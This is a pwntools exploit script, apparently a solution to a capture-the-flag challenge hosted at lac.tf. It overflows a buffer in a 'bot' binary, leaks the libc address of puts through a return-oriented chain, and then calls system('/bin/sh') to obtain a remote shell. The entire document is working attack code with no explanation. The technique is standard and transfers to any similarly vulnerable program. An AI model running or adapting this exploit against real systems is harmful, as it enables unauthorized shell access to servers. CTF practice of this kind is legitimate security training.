from pwn import *

exe = ELF("./bot_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

#p = process("./bot_patched")
#gdb.attach(p)

p = remote("lac.tf", 31180)

pop_rdi_ret = 0x40133b

puts_got = exe.got["puts"]
log.info("puts in got: " + hex(puts_got))
puts_plt = exe.plt["puts"]

payload = b"please please please give me the flag""give me the flag"
payload += b"\x00" # string terminate for strcmp
payload += b"A"*55 # offset after initial string
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(exe.sym["main"])

p.recvline()
p.sendline(payload)

p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address, puts: "+ str(hex(leak)))

libc.address = leak - libc.symbols["puts"] # save libc base

p.recvline()

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))

second_payload = b"please please please give me the flag"
second_payload += b"\x00" 
second_payload += b"A"*34 
second_payload += p64(pop_rdi_ret)
second_payload += p64(binsh)
second_payload += p64(libc_system)
second_payload += p64(libc_exit) # gracefully :)

p.sendline(second_payload)

p.interactive()

